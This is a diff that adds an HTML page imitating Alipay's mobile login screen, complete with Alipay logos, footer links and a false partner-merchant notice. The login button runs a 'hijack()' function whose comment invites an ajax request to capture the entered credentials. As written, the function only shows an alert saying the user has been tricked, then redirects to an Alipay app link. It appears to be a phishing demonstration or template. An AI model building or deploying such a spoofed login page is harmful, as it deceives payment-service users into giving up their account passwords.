@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd"> 
+<html xmlns="http://www.w3.org/1999/xhtml"> 
+<head> 
+<meta http-equiv="Content-Type" content="application/vnd.wap.xhtml+xml;charset=UTF-8" /> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta id="viewport" name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" />
+<meta content="yes" name="apple-mobile-web-app-capable" /> 
+<meta content="black" name="apple-mobile-web-app-status-bar-style" />
+<title>手机支付宝</title>
+<style>
+body,div,p,form{padding:0;margin:0;font-size:12px;}
+body{padding: 0 0 2px 0;-webkit-text-size-adjust:none;}
+body{line-height:16px;}
+img{border:none;vertical-align:-20%;}
+.ap-g-logo{color:#666666; padding:4px 0px;}
+a{color:#0077FF; text-decoration:underline;}
+a:hover{color:#ffffff;background-color:#3796FF;}
+.ap-g-hd{border-top:1px solid #AEAEAE;background-color:#F2F2F2;}
+.ap-g-info{border-top:1px solid #0077ff;background-color:#F2F2F2;}
+.ap-g-help{border-top:1px solid #00cc00;background-color:#f0fff0;}
+.ap-g-footer{border-top:1px solid #AEAEAE;line-height:18px;margin-top:3px;padding:2px 4px;}
+
+.ap-g-t-orange{color:orange;}
+.ap-g-t-orange .tel{font-size:14px;}
+.ap-g-t-red{color:#ff0000}
+.ap-g-t-gray{color:#999;}
+.ap-g-t-green{color:#0C0;}
+.ap-g-t-blue{color:#0077FF;}
+.ap-g-t-reco{color:#f50;}
+.ap-g-t-brown{ color:#FF5500;}
+
+.ap-g-input{height:14px;padding:2px;border:1px solid #aaa;}
+.ap-g-btn-w-auto{border:1px solid #ccc;color:#000;font-weight:bold;cursor:pointer;width:auto;padding:0 15px;height:23px;}
+.ap-g-btn{border:1px solid #ccc;color:#000;font-weight:bold;cursor:pointer;width:100px;height:23px;}
+.btn-ok{background-color:#FE9800;margin-top:5px;}
+.ap-g-btn-long{border:1.5px solid #ccc;color:#000;font-weight:bold;cursor:pointer;width:120px;height:23px;}
+
+.ap-g-tip{background-color:#FFFFCC;padding:6px 5px 6px 4px;border:1px solid #FC3;line-height:1.5em;}
+.ap-g-spe-tip{border-top:1px solid #FF9900;background-color:#FFFFCC;}
+.ap-g-t-center{text-align:center;}
+
+.ap-g-p-mhd{line-height:20px;}
+
+.ap-g-pd4{padding:4px;}
+/*new added*/
+.ap-g-pd-l4{padding-left:4px;}
+.ap-g-pd-l16{padding-left:16px;}
+.ap-g-pd-t4{padding-top:4px;}
+.ap-g-pd-b4{padding-bottom:4px;}
+.ap-g-t-black{color:#000000;}
+.error{color:#ff0000;}
+.ap-g-gg{background:#e5f5ff;border:1px solid #40b3ff;color:#ff9900;padding:4px;margin-bottom:5px;}
+.ap-g-hr{border-bottom:1px solid #AEAEAE;}
+
+/*by litian*/
+.ap-g-mr-b4{ margin-bottom:4px;}
+.ap-g-mr-r4{ margin-right:4px;}
+.ap-g-mr-l4{ margin-left:4px;}
+.ap-g-mr1{ margin:1px;}
+.ap-g-hd-nobr{background-color:#F2F2F2; margin-top:1px;}
+.ap-b{color:#000000;line-height:16px;padding:4px;}
+.b-def{border-top:1px solid #AEAEAE;background-color:#F2F2F2;}
+.b-war{background-color:#FFFFCC;border-top:1px solid #FF9900;}
+.ap-p{ line-height:18px; padding:4px;}
+.ap-g-select{border:1px solid #ccc;color:#000;width:100px;height:23px;}
+.ap-g-noline{ line-height:14px;}
+
+.ap-g-marginT10{margin-top:10px;display:block;padding:4px;}
+
+/*zhuqi*/
+.PD p{line-height:20px;}
+.ap-g-input-width60{width:60px;}
+.ap-title-account{border-top:1px solid #0077FF;background-color:#F3EEFF; padding:4px;
+
+</style>
+
+<script>
+// Hijack somting here, e.g. perform ajax request
+function hijack()
+{
+	alert(document.getElementById('username').value + '，被骗啦，密码是 ' + document.getElementById('username').value);
+	location.href="alipayqr://platformapi/startapp?saId=10000007";
+}
+</script>
+
+</head>
+<body>
+	<div class="ap-g-logo"> <a name="top" href = "http://m.alipay.com/index.htm?awid=hb8vsFNoSaBZSKbQL3UCVtWXEXRDX8mcashier"><img src="https://wappaygw.alipay.com/images/gif/logo_new.gif" alt="手机支付宝" /></a> | 登录 </div> 
+	<div class="ap-g-hd ap-g-pd4">来自 <strong>支付宝手机钱包</strong></div>
+ <div class="ap-g-tip"><img src="https://wappaygw.alipay.com/images/gif/ico-ntc.gif" alt="" /><strong>该商户是支付宝的签约合作商家！</strong>
+  <p class="ap-g-pd-l16">您的账户信息将会在登录后共享给该商家。如同意请使用您的支付宝账户进行登录。</p>
+</div>
+<div class="ap-g-pd4"><strong>支付宝会员</strong></div>
+<form name="cloginFrm" method="get" action="/cgi-bin/login.cgi">
+	<div class="ap-g-pd4">
+		账户名(Email地址或手机号)：<br/>
+		<input id="username" name="u" type="text" value="" class="ap-t" size="24" /><br/>
+				
+		登录密码：<br/>
+		<input id="password" name="p" type="password" value="" class="ap-t" size="24" /><br/>
+                		<input type="button" onclick="hijack()" class="ap-g-btn btn-ok" value="登录" />
+		<div class="ap-p ap-pd-no-lr"> 
+		</div>
+	</div>
+	     </div>
+	
+</form>
+
+<div id='J_um_mob' style="display:none"></div>
+	
+	<div class="ap-g-footer"> 
+		<a href="http://m.alipay.com/index.htm?awid=hb8vsFNoSaBZSKbQL3UCVtWXEXRDX8mcashier">首页</a> | 
+		<a href="http://m.alipay.com/help/help.htm?awid=hb8vsFNoSaBZSKbQL3UCVtWXEXRDX8mcashier&robot=true&scen=cashier">帮助</a> | 
+		<a href="http://m.alipay.com/help/feedback.htm?awid=hb8vsFNoSaBZSKbQL3UCVtWXEXRDX8mcashier">反馈</a> <br/>
+  ALIPAY.COM </div>
+	<div style="color:#FFF;font:12px arial;text-align:center;">mcashier-60-73</div>
+	</body>
+
+</html>
